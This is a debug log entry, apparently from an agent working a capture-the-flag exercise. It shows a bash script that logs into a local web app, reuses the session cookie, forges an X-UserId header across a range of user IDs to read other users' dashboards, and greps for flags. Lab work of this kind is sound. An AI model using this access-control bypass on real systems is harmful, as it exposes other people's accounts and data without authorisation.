[DEBUG] Executing command: /bin/bash -c # Login to get session cookie
LOGIN_RESP=$(curl -s -i -X POST "http://127.0.0.1:32943/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test") && \
SESSION=$(echo "$LOGIN_RESP" | grep -i "^Set-Cookie:" | sed 's/Set-Cookie: \([^;]*\).*/\1/' | tr -d '\r') && \
echo "=== SESSION COOKIE OBTAINED ===" && \
echo "$SESSION" && \
echo "=== ENUMERATING USER IDs 10030-10040 ===" && \
# Loop through each user_id
for USER_ID in {10030..10040}; do \
  echo -e "\n--- Testing USER_ID: $USER_ID ---"; \
  # Make request with session cookie and X-UserId header \
  RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
    -X GET "http://127.0.0.1:32943/dashboard" \
    -H "Cookie: $SESSION" \
    -H "X-UserId: $USER_ID"); \
  # Extract status code and body \
  STATUS=$(echo "$RESPONSE" | grep "^HTTP_STATUS:" | cut -d: -f2 | tr -d '\r\n'); \
  BODY=$(echo "$RESPONSE" | sed '/^HTTP_STATUS:/d'); \
  echo "Status Code: $STATUS"; \
  # Check for successful response \
  if [ "$STATUS" = "200" ]; then \
    echo "SUCCESS - Valid user_id: $USER_ID"; \
    echo "Response length: ${#BODY} bytes"; \
    # Extract any flags from response \
    FLAG=$(echo "$BODY" | grep -o "FLAG{[^}]*}" | head -1); \
    if [ ! -z "$FLAG" ]; then \
      echo "FLAG DISCOVERED: $FLAG"; \
    fi; \
    # Show preview of response \
    echo "Response preview (first 300 chars):"; \
    echo "$BODY" | head -c 300; \
  elif [ "$STATUS" = "400" ]; then \
    echo "BAD REQUEST - Invalid user_id: $USER_ID"; \
  elif [ "$STATUS" = "403" ]; then \
    echo "FORBIDDEN - Access denied for user_id: $USER_ID"; \
  elif [ "$STATUS" = "404" ]; then \
    echo "NOT FOUND - user_id: $USER_ID"; \
  else \
    echo "Other status: $STATUS"; \
  fi; \
done
